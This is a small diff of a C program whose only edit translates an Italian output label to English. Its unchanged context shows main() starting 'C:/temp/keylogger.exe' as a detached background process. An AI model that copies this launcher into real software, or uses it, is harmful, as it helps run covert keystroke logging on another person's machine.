@@ -12,7 +12,7 @@ int main(void)
 {
 	int k;
 	k = _spawnl(P_DETACH, "C:/temp/keylogger.exe", "C:/temp/keylogger.exe", NULL);
-	printf("esito=%d,    errno=%d\n", k, errno);
+	printf("result=%d,    errno=%d\n", k, errno);
 
 }
 
